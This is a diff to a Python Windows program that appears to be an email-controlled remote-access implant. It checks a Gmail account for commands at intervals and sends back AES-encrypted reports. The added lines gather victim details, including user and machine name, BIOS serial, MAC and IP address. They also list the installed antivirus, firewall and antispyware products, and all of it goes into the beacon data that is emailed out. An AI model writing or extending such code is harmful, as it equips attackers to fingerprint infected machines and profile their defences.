@@ -44,7 +44,11 @@ import hashlib
 import ctypes
 import json
 import wmi
+import getpass
+import uuid
+import netifaces
 
+from win32com.client import GetObject
 from enum import Enum
 from base64 import b64decode
 from smtplib import SMTP
@@ -68,6 +72,8 @@ server = "smtp.gmail.com"
 server_port = 587
 AESKey = 'my_AES_key'
 EMAIL_KNOCK_TIMEOUT = 60 #seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+TAG = 'RELEASE'
+VERSION = '1.0.0'
 #######################################
 
 
@@ -129,6 +135,8 @@ class SystemInfo:
         self.Architecture = platform.machine()
         self.WinVer = platform.platform()
         self.CPU = platform.processor()
+        self.User = getpass.getuser()
+        self.PCName = platform.node()
         self.isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
         if self.isAdmin == 0:
             self.isAdmin = 'no'
@@ -148,6 +156,32 @@ class SystemInfo:
                 self.ChassisType = str(ChassisTypes(j)).split('.')[1]
                 break
             break
+        self.TotalRam = 0.0
+        for i in w.Win32_ComputerSystem():
+            self.TotalRam = (round(float(i.TotalPhysicalMemory) / 1024 / 1024 / 1024))
+            break
+        self.Bios = ''
+        for i in w.Win32_BIOS():
+            self.Bios = '{0} {1} {2}'.format(i.Caption, i.Manufacturer, i.SerialNumber).strip()
+            break
+        self.PID = os.getpid()
+        self.MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+        self.IPv4 = ''
+        for iface in netifaces.interfaces():
+            if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC:
+                self.IPv4 = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])[0]['addr']
+        self.Antivirus = []
+        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiVirusProduct')
+        for i in objWMI:
+            self.Antivirus.append(i.displayName.strip())
+        self.Firewall = []
+        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('FirewallProduct')
+        for i in objWMI:
+            self.Firewall.append(i.displayName.strip())
+        self.Antispyware = []
+        objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiSpywareProduct')
+        for i in objWMI:
+            self.Antispyware.append(i.displayName.strip())
         
         self.UniqueID = hashlib.sha256(
                            self.Architecture + 
@@ -156,10 +190,14 @@ class SystemInfo:
                            ';'.join(self.GPU) + 
                            self.isAdmin + 
                            self.Motherboard + 
-                           self.ChassisType
+                           self.ChassisType + 
+                           '{0}@{1}'.format(self.User, self.PCName) + 
+                           str(self.TotalRam) + 
+                           self.Bios + 
+                           self.MAC
                    ).hexdigest()
-        
-            
+
+
 sysInfo = SystemInfo()
 
 
@@ -643,6 +681,7 @@ class sendEmail(threading.Thread):
 
         message_content = infoSec.Encrypt(json.dumps({
                   'fgwindow': detectForgroundWindows(), 
+                  'user': '{0}@{1}'.format(sysInfo.User, sysInfo.PCName),
                   'arch': sysInfo.Architecture, 
                   'os': sysInfo.WinVer, 
                   'cpu': sysInfo.CPU,
@@ -650,6 +689,16 @@ class sendEmail(threading.Thread):
                   'motherboard': sysInfo.Motherboard,
                   'isAdmin': sysInfo.isAdmin,
                   'chassistype': sysInfo.ChassisType,
+                  'totalram': sysInfo.TotalRam,
+                  'bios': sysInfo.Bios,
+                  'pid': sysInfo.PID,
+                  'mac': sysInfo.MAC,
+                  'ipv4': sysInfo.IPv4,
+                  'av': sysInfo.Antivirus,
+                  'firewall': sysInfo.Firewall,
+                  'antispyware': sysInfo.Antispyware,
+                  'tag': TAG,
+                  'version': VERSION,
                   'msg': self.text
           }))
         
